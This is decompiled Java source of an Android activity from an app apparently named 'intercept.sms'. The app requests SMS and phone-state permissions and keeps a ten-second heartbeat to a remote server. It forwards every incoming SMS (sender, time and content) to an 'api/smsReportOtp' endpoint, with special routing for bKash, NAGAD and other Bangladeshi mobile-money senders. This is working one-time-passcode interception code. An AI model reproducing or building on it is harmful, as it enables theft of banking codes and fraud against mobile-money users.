package top.xy12.codetransporter.page;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import com.hjq.permissions.OnPermissionCallback;
import com.hjq.permissions.Permission;
import com.hjq.permissions.XXPermissions;
import com.intercept.sms.R;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import top.xy12.codetransporter.adapter.RecycleViewAdapter;
import top.xy12.codetransporter.bean.MessageBean;
import top.xy12.codetransporter.interfaces.CallBack;
import top.xy12.codetransporter.page.MainActivity;
import top.xy12.codetransporter.util.OkHttpUtils;
import top.xy12.codetransporter.util.SharedPreferencesUtil;
import top.xy12.codetransporter.util.SimUtils;

/* loaded from: classes.dex */
public class MainActivity extends AppCompatActivity {
    public static final String BROAD_ACTION = "SMS_MESSAGE";
    private static final int MY_PERMISSIONS_REQUEST_READ_CONTACTS = 1001;
    protected static final int PERMISSION_REQUEST_CODE = 11186;
    private RecycleViewAdapter adapter;
    private Button btnEdit;
    private Button btnEdit1;
    private Button btnEdit2;
    private boolean flag;
    private List<MessageBean> list = new ArrayList();
    private RecyclerView recyclerView;
    private EditText sim1;
    private EditText sim2;
    private EditText sim3;
    private SmsReceiver smsReceiver;
    private Timer timer;
    private TimerTask timerTask;
    private TextView tv_state;

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
        getWindow().addFlags(128);
        Log.w("SmsReceiver", "phoneNumber list: " + SimUtils.getPhoneNumber(this));
        this.recyclerView = (RecyclerView) findViewById(R.id.recycle_view);
        this.tv_state = (TextView) findViewById(R.id.tv_state);
        RecycleViewAdapter recycleViewAdapter = new RecycleViewAdapter(this, this.list);
        this.adapter = recycleViewAdapter;
        this.recyclerView.setAdapter(recycleViewAdapter);
        this.recyclerView.setLayoutManager(new LinearLayoutManager(this));
        checkPermission(Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE, Permission.READ_SMS);
        getPermission();
        getPhoneNumber();
        this.btnEdit.setOnClickListener(new View.OnClickListener() { // from class: top.xy12.codetransporter.page.MainActivity$$ExternalSyntheticLambda3
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.this.m1905lambda$onCreate$0$topxy12codetransporterpageMainActivity(view);
            }
        });
        this.sim1.setFocusable(false);
        this.sim2.setFocusable(false);
        this.sim3.setFocusable(false);
        this.btnEdit1.setOnClickListener(new View.OnClickListener() { // from class: top.xy12.codetransporter.page.MainActivity$$ExternalSyntheticLambda4
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.this.m1906lambda$onCreate$1$topxy12codetransporterpageMainActivity(view);
            }
        });
        this.btnEdit2.setOnClickListener(new View.OnClickListener() { // from class: top.xy12.codetransporter.page.MainActivity$$ExternalSyntheticLambda5
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.this.m1907lambda$onCreate$2$topxy12codetransporterpageMainActivity(view);
            }
        });
        findViewById(R.id.manual_submission).setOnClickListener(new View.OnClickListener() { // from class: top.xy12.codetransporter.page.MainActivity$$ExternalSyntheticLambda6
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.this.m1911lambda$onCreate$6$topxy12codetransporterpageMainActivity(view);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: lambda$onCreate$0$top-xy12-codetransporter-page-MainActivity, reason: not valid java name */
    public /* synthetic */ void m1905lambda$onCreate$0$topxy12codetransporterpageMainActivity(View view) {
        if (this.btnEdit.getText().toString().equals("edit")) {
            this.sim1.setFocusableInTouchMode(true);
            this.sim1.setFocusable(true);
            this.btnEdit.setText("ok");
            InputMethodManager inputMethodManager = (InputMethodManager) getSystemService("input_method");
            if (inputMethodManager != null) {
                inputMethodManager.showSoftInput(this.sim1, 2);
            }
        } else {
            this.btnEdit.setText("edit");
            this.sim1.setFocusable(false);
            InputMethodManager inputMethodManager2 = (InputMethodManager) getSystemService("input_method");
            if (inputMethodManager2 != null && inputMethodManager2.isActive()) {
                inputMethodManager2.hideSoftInputFromWindow(this.sim1.getWindowToken(), 0);
            }
        }
        if (!TextUtils.isEmpty(this.sim1.getText().toString())) {
            SharedPreferencesUtil.getInstance(this).put("inputPhone", this.sim1.getText().toString());
        }
        sendHeart();
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: lambda$onCreate$1$top-xy12-codetransporter-page-MainActivity, reason: not valid java name */
    public /* synthetic */ void m1906lambda$onCreate$1$topxy12codetransporterpageMainActivity(View view) {
        if (this.btnEdit1.getText().toString().equals("edit")) {
            this.sim2.setFocusableInTouchMode(true);
            this.sim2.setFocusable(true);
            this.btnEdit1.setText("ok");
            InputMethodManager inputMethodManager = (InputMethodManager) getSystemService("input_method");
            if (inputMethodManager != null) {
                inputMethodManager.showSoftInput(this.sim2, 2);
            }
        } else {
            this.btnEdit1.setText("edit");
            this.sim2.setFocusable(false);
            InputMethodManager inputMethodManager2 = (InputMethodManager) getSystemService("input_method");
            if (inputMethodManager2 != null && inputMethodManager2.isActive()) {
                inputMethodManager2.hideSoftInputFromWindow(this.sim2.getWindowToken(), 0);
            }
        }
        sendHeart();
        if (TextUtils.isEmpty(this.sim2.getText().toString())) {
            return;
        }
        SharedPreferencesUtil.getInstance(this).put("inputPhone1", this.sim2.getText().toString());
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: lambda$onCreate$2$top-xy12-codetransporter-page-MainActivity, reason: not valid java name */
    public /* synthetic */ void m1907lambda$onCreate$2$topxy12codetransporterpageMainActivity(View view) {
        if (this.btnEdit2.getText().toString().equals("edit")) {
            this.sim3.setFocusableInTouchMode(true);
            this.sim3.setFocusable(true);
            this.btnEdit2.setText("ok");
            InputMethodManager inputMethodManager = (InputMethodManager) getSystemService("input_method");
            if (inputMethodManager != null) {
                inputMethodManager.showSoftInput(this.sim3, 2);
            }
        } else {
            this.btnEdit2.setText("edit");
            this.sim3.setFocusable(false);
            InputMethodManager inputMethodManager2 = (InputMethodManager) getSystemService("input_method");
            if (inputMethodManager2 != null && inputMethodManager2.isActive()) {
                inputMethodManager2.hideSoftInputFromWindow(this.sim3.getWindowToken(), 0);
            }
        }
        sendHeart();
        if (TextUtils.isEmpty(this.sim3.getText().toString())) {
            return;
        }
        SharedPreferencesUtil.getInstance(this).put("inputPhone2", this.sim3.getText().toString());
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: lambda$onCreate$6$top-xy12-codetransporter-page-MainActivity, reason: not valid java name */
    public /* synthetic */ void m1911lambda$onCreate$6$topxy12codetransporterpageMainActivity(View view) {
        View inflate = LayoutInflater.from(this).inflate(R.layout.dialog_custom, (ViewGroup) null);
        final EditText editText = (EditText) inflate.findViewById(R.id.et_input);
        final RadioGroup radioGroup = (RadioGroup) inflate.findViewById(R.id.radio_group);
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Please choose an app");
        builder.setView(inflate);
        final AlertDialog create = builder.create();
        create.show();
        inflate.findViewById(R.id.submit).setOnClickListener(new View.OnClickListener() { // from class: top.xy12.codetransporter.page.MainActivity$$ExternalSyntheticLambda9
            @Override // android.view.View.OnClickListener
            public final void onClick(View view2) {
                MainActivity.this.m1910lambda$onCreate$5$topxy12codetransporterpageMainActivity(editText, radioGroup, create, view2);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: lambda$onCreate$5$top-xy12-codetransporter-page-MainActivity, reason: not valid java name */
    public /* synthetic */ void m1910lambda$onCreate$5$topxy12codetransporterpageMainActivity(EditText editText, RadioGroup radioGroup, final AlertDialog alertDialog, View view) {
        final String trim = editText.getText().toString().trim();
        final int checkedIndex = getCheckedIndex(radioGroup);
        if (checkedIndex == -1) {
            Toast.makeText(this, "Please choose an app", 0).show();
        } else if (trim.isEmpty()) {
            Toast.makeText(this, "Please enter content", 0).show();
        } else {
            new Thread(new Runnable() { // from class: top.xy12.codetransporter.page.MainActivity$$ExternalSyntheticLambda2
                @Override // java.lang.Runnable
                public final void run() {
                    MainActivity.this.m1909lambda$onCreate$4$topxy12codetransporterpageMainActivity(checkedIndex, trim, alertDialog);
                }
            }).start();
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: lambda$onCreate$4$top-xy12-codetransporter-page-MainActivity, reason: not valid java name */
    public /* synthetic */ void m1909lambda$onCreate$4$topxy12codetransporterpageMainActivity(int i, String str, AlertDialog alertDialog) {
        String obj;
        int i2 = i + 1;
        HashMap hashMap = new HashMap();
        if (i2 == 1) {
            obj = this.sim1.getText().toString();
        } else if (i2 == 2) {
            obj = this.sim2.getText().toString();
        } else {
            obj = i2 != 3 ? "" : this.sim3.getText().toString();
        }
        if (obj.isEmpty()) {
            runOnUiThread(new Runnable() { // from class: top.xy12.codetransporter.page.MainActivity$$ExternalSyntheticLambda7
                @Override // java.lang.Runnable
                public final void run() {
                    MainActivity.this.m1908lambda$onCreate$3$topxy12codetransporterpageMainActivity();
                }
            });
            return;
        }
        hashMap.put("phone", obj);
        hashMap.put("acType", Integer.valueOf(i2));
        hashMap.put("content", str);
        hashMap.put("time", System.currentTimeMillis() + "");
        OkHttpUtils.apkSubmit(this, "api/sms/apkSubmit", hashMap);
        alertDialog.dismiss();
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: lambda$onCreate$3$top-xy12-codetransporter-page-MainActivity, reason: not valid java name */
    public /* synthetic */ void m1908lambda$onCreate$3$topxy12codetransporterpageMainActivity() {
        Toast.makeText(this, "Please enter phone", 0).show();
    }

    private int getCheckedIndex(RadioGroup radioGroup) {
        int childCount = radioGroup.getChildCount();
        for (int i = 0; i < childCount; i++) {
            View childAt = radioGroup.getChildAt(i);
            if ((childAt instanceof RadioButton) && ((RadioButton) childAt).isChecked()) {
                return i;
            }
        }
        return -1;
    }

    public void sendHeart() {
        new Thread(new Runnable() { // from class: top.xy12.codetransporter.page.MainActivity$$ExternalSyntheticLambda8
            @Override // java.lang.Runnable
            public final void run() {
                MainActivity.this.m1912lambda$sendHeart$7$topxy12codetransporterpageMainActivity();
            }
        }).start();
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: lambda$sendHeart$7$top-xy12-codetransporter-page-MainActivity, reason: not valid java name */
    public /* synthetic */ void m1912lambda$sendHeart$7$topxy12codetransporterpageMainActivity() {
        HashMap hashMap = new HashMap();
        hashMap.put("phoneList", getSim(this));
        OkHttpUtils.heartbeat(getApplicationContext(), "api/heartbeat", hashMap, new AnonymousClass1());
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: top.xy12.codetransporter.page.MainActivity$1, reason: invalid class name */
    /* loaded from: classes.dex */
    public class AnonymousClass1 implements CallBack {
        AnonymousClass1() {
        }

        @Override // top.xy12.codetransporter.interfaces.CallBack
        public void onSuccess() {
            MainActivity.this.runOnUiThread(new Runnable() { // from class: top.xy12.codetransporter.page.MainActivity$1$$ExternalSyntheticLambda0
                @Override // java.lang.Runnable
                public final void run() {
                    MainActivity.AnonymousClass1.this.m1914lambda$onSuccess$0$topxy12codetransporterpageMainActivity$1();
                }
            });
        }

        /* JADX INFO: Access modifiers changed from: package-private */
        /* renamed from: lambda$onSuccess$0$top-xy12-codetransporter-page-MainActivity$1, reason: not valid java name */
        public /* synthetic */ void m1914lambda$onSuccess$0$topxy12codetransporterpageMainActivity$1() {
            MainActivity.this.tv_state.setText("apk Online success");
        }

        @Override // top.xy12.codetransporter.interfaces.CallBack
        public void onFail(final String str) {
            MainActivity.this.runOnUiThread(new Runnable() { // from class: top.xy12.codetransporter.page.MainActivity$1$$ExternalSyntheticLambda1
                @Override // java.lang.Runnable
                public final void run() {
                    MainActivity.AnonymousClass1.this.m1913lambda$onFail$1$topxy12codetransporterpageMainActivity$1(str);
                }
            });
        }

        /* JADX INFO: Access modifiers changed from: package-private */
        /* renamed from: lambda$onFail$1$top-xy12-codetransporter-page-MainActivity$1, reason: not valid java name */
        public /* synthetic */ void m1913lambda$onFail$1$topxy12codetransporterpageMainActivity$1(String str) {
            MainActivity.this.tv_state.setText("apk Offline：" + str);
        }
    }

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, android.app.Activity
    public void onResume() {
        super.onResume();
        if (this.smsReceiver == null) {
            this.smsReceiver = new SmsReceiver();
        }
        registerReceiver(this.smsReceiver, new IntentFilter(BROAD_ACTION));
        if (this.timer == null) {
            this.timer = new Timer();
            TimerTask timerTask = new TimerTask() { // from class: top.xy12.codetransporter.page.MainActivity.2
                @Override // java.util.TimerTask, java.lang.Runnable
                public void run() {
                    MainActivity.this.sendHeart();
                }
            };
            this.timerTask = timerTask;
            this.timer.schedule(timerTask, 1000L, 10000L);
        }
    }

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, android.app.Activity
    public void onPause() {
        super.onPause();
        SmsReceiver smsReceiver = this.smsReceiver;
        if (smsReceiver != null) {
            unregisterReceiver(smsReceiver);
            this.smsReceiver = null;
        }
        Timer timer = this.timer;
        if (timer != null) {
            timer.cancel();
            this.timerTask.cancel();
            this.timer = null;
            this.timerTask = null;
        }
        this.tv_state.setText("apk离线：");
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void getPhoneNumber() {
        this.sim1 = (EditText) findViewById(R.id.sim1_tv);
        this.sim2 = (EditText) findViewById(R.id.sim2_tv);
        this.sim3 = (EditText) findViewById(R.id.sim3_tv);
        this.btnEdit = (Button) findViewById(R.id.edit_bt);
        this.btnEdit1 = (Button) findViewById(R.id.edit_bt1);
        this.btnEdit2 = (Button) findViewById(R.id.edit_bt2);
        String str = SharedPreferencesUtil.getInstance(this).get("inputPhone", "");
        if (!TextUtils.isEmpty(str)) {
            this.sim1.setText(str);
        }
        String str2 = SharedPreferencesUtil.getInstance(this).get("inputPhone1", "");
        if (!TextUtils.isEmpty(str2)) {
            this.sim2.setText(str2);
        }
        String str3 = SharedPreferencesUtil.getInstance(this).get("inputPhone2", "");
        if (TextUtils.isEmpty(str3)) {
            return;
        }
        this.sim3.setText(str3);
    }

    protected boolean checkPermission(String... strArr) {
        if (Build.VERSION.SDK_INT >= 23) {
            String[] requestPermissions = getRequestPermissions(strArr);
            if (requestPermissions.length <= 0) {
                return true;
            }
            requestPermissions(requestPermissions, PERMISSION_REQUEST_CODE);
            return false;
        }
        int[] iArr = new int[strArr.length];
        Arrays.fill(iArr, 0);
        onRequestPermissionsResult(PERMISSION_REQUEST_CODE, strArr, iArr);
        return false;
    }

    private String[] getRequestPermissions(String[] strArr) {
        int checkSelfPermission;
        ArrayList arrayList = new ArrayList();
        for (String str : strArr) {
            checkSelfPermission = checkSelfPermission(str);
            if (checkSelfPermission == -1) {
                arrayList.add(str);
            }
        }
        return (String[]) arrayList.toArray(new String[arrayList.size()]);
    }

    public static List<String> getSim(Context context) {
        ArrayList arrayList = new ArrayList();
        String str = SharedPreferencesUtil.getInstance(context).get("inputPhone", "");
        if (!TextUtils.isEmpty(str)) {
            arrayList.add(str);
        }
        String str2 = SharedPreferencesUtil.getInstance(context).get("inputPhone1", "");
        if (!TextUtils.isEmpty(str2)) {
            arrayList.add(str2);
        }
        String str3 = SharedPreferencesUtil.getInstance(context).get("inputPhone2", "");
        if (!TextUtils.isEmpty(str3)) {
            arrayList.add(str3);
        }
        return arrayList;
    }

    public void getPermission() {
        XXPermissions.with(this).permission(Permission.READ_PHONE_STATE, Permission.READ_SMS, Permission.READ_SMS, Permission.SEND_SMS, Permission.RECEIVE_SMS, Permission.RECEIVE_WAP_PUSH, Permission.RECEIVE_MMS).request(new OnPermissionCallback() { // from class: top.xy12.codetransporter.page.MainActivity.3
            @Override // com.hjq.permissions.OnPermissionCallback
            public void onDenied(List<String> list, boolean z) {
            }

            @Override // com.hjq.permissions.OnPermissionCallback
            public void onGranted(List<String> list, boolean z) {
                Log.w("SmsReceiver", "allGranted: " + z);
                Log.w("SmsReceiver", "permissions: " + list);
                Iterator<String> it = list.iterator();
                while (it.hasNext()) {
                    if (it.next().contains("READ_PHONE_STATE")) {
                        Log.w("SmsReceiver", "准备启动服务: " + z);
                        MainActivity.this.getPhoneNumber();
                    }
                }
            }
        });
    }

    /* loaded from: classes.dex */
    public class SmsReceiver extends BroadcastReceiver {
        public SmsReceiver() {
        }

        @Override // android.content.BroadcastReceiver
        public void onReceive(final Context context, Intent intent) {
            MainActivity.this.flag = false;
            MessageBean messageBean = (MessageBean) intent.getParcelableExtra("smsMessage");
            if (messageBean != null) {
                StringBuffer stringBuffer = new StringBuffer("回调到主界面\nmessageBean: ");
                stringBuffer.append(messageBean.toString()).append("\n输入的号码：");
                Log.e("SmsReceiver", "接收到SmsReceiver111 : " + messageBean);
                final HashMap hashMap = new HashMap();
                List<String> sim = MainActivity.getSim(context);
                stringBuffer.append(sim).append("\n输入的号码：");
                if (sim.isEmpty()) {
                    View inflate = LayoutInflater.from(context).inflate(R.layout.dialog_phone_null, (ViewGroup) null);
                    AlertDialog.Builder builder = new AlertDialog.Builder(context);
                    builder.setTitle("Please enter your phone number");
                    builder.setView(inflate);
                    final AlertDialog create = builder.create();
                    create.show();
                    inflate.findViewById(R.id.ok).setOnClickListener(new View.OnClickListener() { // from class: top.xy12.codetransporter.page.MainActivity$SmsReceiver$$ExternalSyntheticLambda0
                        @Override // android.view.View.OnClickListener
                        public final void onClick(View view) {
                            AlertDialog.this.dismiss();
                        }
                    });
                    return;
                }
                stringBuffer.append(sim).append("\n回调到主界面\nmessageBean: ");
                Log.e("SmsReceiver", "messageBean.getSenderNumber() : " + messageBean);
                Log.e("SmsReceiver", "messageBean.getSenderNumber() : " + messageBean.getSenderNumber());
                Log.e("SmsReceiver", "messageBean.getSenderNumber() : " + messageBean.getSenderNumber());
                stringBuffer.append(messageBean.toString()).append("\nmessageBean.getState()：");
                hashMap.put("sender", messageBean.getSenderNumber());
                hashMap.put("time", Long.valueOf(messageBean.getTime()));
                hashMap.put("content", messageBean.getContent());
                stringBuffer.append(messageBean.getState()).append("\n!messageBean.getSenderNumber().isEmpty()：");
                if (messageBean.getState() == 0) {
                    stringBuffer.append(!messageBean.getSenderNumber().isEmpty()).append("\n");
                    if (!messageBean.getSenderNumber().isEmpty()) {
                        stringBuffer.append("messageBean.getSenderNumber()：").append(messageBean.getSenderNumber()).append("\n");
                        if (messageBean.getSenderNumber().equalsIgnoreCase("NAGAD")) {
                            hashMap.put("receive", sim.get(0));
                            messageBean.setPhoneNumber(sim.get(0));
                        } else if (messageBean.getSenderNumber().equalsIgnoreCase("bKash")) {
                            if (sim.size() == 1) {
                                hashMap.put("receive", sim.get(0));
                                messageBean.setPhoneNumber(sim.get(0));
                            } else {
                                hashMap.put("receive", sim.get(1));
                                messageBean.setPhoneNumber(sim.get(1));
                            }
                        } else if (messageBean.getSenderNumber().contains("16216")) {
                            hashMap.put("receive", sim.get(sim.size() - 1));
                            messageBean.setPhoneNumber(sim.get(sim.size() - 1));
                        } else {
                            stringBuffer.append("短信监听不是孟加拉银行号码,号码是: ").append(messageBean.getSenderNumber()).append("\n");
                            MainActivity.this.flag = true;
                            messageBean.setPhoneNumber(sim.get(sim.size() - 1));
                            hashMap.put("receive", sim.get(sim.size() - 1));
                        }
                    } else {
                        hashMap.put("receive", messageBean.getPhoneNumber());
                    }
                    new Thread(new Runnable() { // from class: top.xy12.codetransporter.page.MainActivity$SmsReceiver$$ExternalSyntheticLambda1
                        @Override // java.lang.Runnable
                        public final void run() {
                            OkHttpUtils.smsReportOtp(context, "api/smsReportOtp", hashMap);
                        }
                    }).start();
                    stringBuffer.append(messageBean.getLogInfo()).append("\n开始请求服务器：\n");
                    messageBean.setLogInfo(stringBuffer.toString());
                }
            } else {
                messageBean = new MessageBean();
                messageBean.setContent("对象为空，请检查接收短信是否成功");
            }
            MainActivity.this.adapter.setData(messageBean);
            MainActivity.this.recyclerView.smoothScrollToPosition(MainActivity.this.adapter.getItemCount() - 1);
        }
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i, strArr, iArr);
        Log.w("SmsReceiver", "requestCode: " + i);
        if (i != 1001) {
            return;
        }
        if (iArr.length <= 0 || iArr[0] != 0) {
            Log.w("SmsReceiver", "权限被用户拒绝: ");
        }
    }
}
